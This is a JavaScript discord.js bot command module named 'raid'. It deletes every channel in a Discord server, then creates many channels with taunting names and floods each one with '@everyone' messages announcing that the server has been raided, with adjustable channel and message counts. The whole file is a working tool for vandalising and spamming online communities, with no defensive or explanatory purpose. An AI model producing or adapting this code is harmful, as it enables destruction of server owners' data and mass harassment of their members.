const { ChannelType } = require('discord.js');

module.exports = {
  name: 'raid',
  description: 'Deletes all channels and performs a raid.',
  async execute(interaction) {
    const { guild, user } = interaction;

    // Defaults
    const defaultMessage = `YOUR SERVER HAS BEEN RAIDED BY ${interaction.client.user} !!! \n @everyone`;
    const defaultChannelAmount = 10;
    const defaultChannelNames = ['HAHA', 'LOL', 'raided']; // Default list of channel names
    const defaultErrorMessage = 'An internal error has occurred, please check console.';
    const defaultNumberOfMessagesPerChannel = 5;

    const throwInteractionError = (errorMessage) => {
      user.send({ content: errorMessage, ephemeral: true });
    }

    let userChannelAmount = interaction.options.getInteger('channel-amount') || defaultChannelAmount;
    let userMessage = interaction.options.getString('raid-message') || defaultMessage;
    let userChannelNames = interaction.options.getString('channel-names'); // User-provided channel names
    let NumberOfMessagesPerChannel = interaction.options.getInteger('message-amt-per-channel') || defaultNumberOfMessagesPerChannel;

    // If user did not provide channel names, use default list
    userChannelNames = userChannelNames ? userChannelNames.split('|') : defaultChannelNames;
    userMessage = userMessage.split('|'); // Split userMessage by '|'

    try {
      const channels = Array.from(guild.channels.cache.values());
      await Promise.all(channels.map(channel => channel.delete()));
    } catch (error) {
      console.error("Error deleting channels:", error);
      throwInteractionError('Raid Failed ! Invalid Permissions.');
      return;
    }

    try {
      const newChannel = await guild.channels.create({
        name: `${userChannelNames[Math.floor(Math.random() * userChannelNames.length)]}`,
        type: ChannelType.GuildText,
      });

      await Promise.all(
        Array.from({ length: userChannelAmount }, async (_, i) => {
          const duplicateChannel = await guild.channels.create({
            name: `${userChannelNames[Math.floor(Math.random() * userChannelNames.length)]}`,
            type: ChannelType.GuildText,
            parent: newChannel.parent,
          });

          await Promise.all(
            Array.from({ length: NumberOfMessagesPerChannel }, async () => {
              try {
                await duplicateChannel.send(userMessage[Math.floor(Math.random() * userMessage.length)]);
              } catch (error) {
                console.error("Error sending message:", error);
              }
            })
          );
        })
      );
    } catch (error) {
      throwInteractionError(defaultErrorMessage);
      console.error("Error creating channels:", error);
    }
  }
}
